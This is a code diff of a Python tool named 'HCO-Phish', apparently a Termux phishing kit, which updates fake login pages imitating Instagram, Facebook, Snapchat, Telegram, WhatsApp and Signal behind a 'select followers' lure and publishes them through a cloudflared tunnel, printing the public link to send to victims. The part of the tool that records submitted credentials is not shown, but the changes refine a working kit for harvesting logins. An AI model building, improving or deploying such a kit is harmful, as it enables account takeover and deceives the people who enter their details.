@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# HCO-Phish v7 – Full Working Version
+# HCO-Phish v8 – Full Working Version
 # Single-file Termux Tool
 
-import os, sys, time, subprocess, threading, webbrowser, shutil
+import os, sys, time, subprocess, threading, webbrowser, shutil, re
 from colorama import Fore, init
 from flask import Flask, render_template_string, request
 
@@ -68,15 +68,14 @@ templates = {
 "Instagram": """<html><head><title>Instagram</title>
 <style>
 body{background:#fafafa;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#f0f0f0;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#405DE6;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #dbdbdb;font-size:16px;}
+input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#405DE6;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-img{width:120px;margin-bottom:20px;}
 </style></head>
 <body>
-<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
 <div class="login-box">
+<h1>Instagram Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -93,15 +92,14 @@ img{width:120px;margin-bottom:20px;}
 "Facebook": """<html><head><title>Facebook</title>
 <style>
 body{background:#e9ebee;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#fff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#1877f2;font-size:28px;margin-bottom:15px;}
 input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#1877f2;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-img{width:120px;margin-bottom:20px;}
 </style></head>
 <body>
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
 <div class="login-box">
+<h1>Facebook Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -118,14 +116,14 @@ img{width:120px;margin-bottom:20px;}
 "Snapchat": """<html><head><title>Snapchat</title>
 <style>
 body{background:#fffc00;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#fff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#fffc00;font-size:28px;margin-bottom:15px;}
 input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#fffc00;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
 </style></head>
 <body>
 <div class="login-box">
-<h1>Snapchat</h1>
+<h1>Snapchat Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -142,14 +140,14 @@ button{padding:10px 20px;background:#fffc00;color:#000;border:none;border-radius
 "Telegram": """<html><head><title>Telegram</title>
 <style>
 body{background:#0088cc;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#f0f8ff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#0088cc;font-size:28px;margin-bottom:15px;}
 input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
 </style></head>
 <body>
 <div class="login-box">
-<h1>Telegram</h1>
+<h1>Telegram Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -166,14 +164,14 @@ button{padding:10px 20px;background:#0088cc;color:white;border:none;border-radiu
 "WhatsApp": """<html><head><title>WhatsApp</title>
 <style>
 body{background:#25d366;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#e6ffe6;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#25d366;font-size:28px;margin-bottom:15px;}
 input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#25d366;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
 </style></head>
 <body>
 <div class="login-box">
-<h1>WhatsApp</h1>
+<h1>WhatsApp Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -190,14 +188,14 @@ button{padding:10px 20px;background:#25d366;color:white;border:none;border-radiu
 "Signal": """<html><head><title>Signal</title>
 <style>
 body{background:#3a76f0;font-family:Arial;text-align:center;}
-.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
+.login-box{background:#e6f0ff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
 h1{color:#3a76f0;font-size:28px;margin-bottom:15px;}
 input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
 button{padding:10px 20px;background:#3a76f0;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
 </style></head>
 <body>
 <div class="login-box">
-<h1>Signal</h1>
+<h1>Signal Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -239,14 +237,21 @@ def start_cloudflared():
         print(Fore.RED + "[!] cloudflared not installed. Install manually using 'pkg install cloudflared'")
         return
     print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
-    proc=subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    proc=subprocess.Popen(
+        ["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+    public_url=None
     while True:
         line=proc.stdout.readline()
-        if "trycloudflare.com" in line:
-            print(Fore.LIGHTGREEN_EX + f"[*] Public URL: {line.strip()}/simulate/{selected_service.lower()}")
-            break
+        if line:
+            print(Fore.LIGHTBLACK_EX + line.strip())
+            match=re.search(r"https://[a-zA-Z0-9.-]+trycloudflare\.com", line)
+            if match:
+                public_url=match.group(0)
+                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {public_url}/simulate/{selected_service.lower()}")
+                break
 
+# ------------------ Run ------------------ #
 threading.Thread(target=start_cloudflared, daemon=True).start()
-
-# ------------------ Run Flask ------------------ #
 app.run(host="0.0.0.0", port=5000)
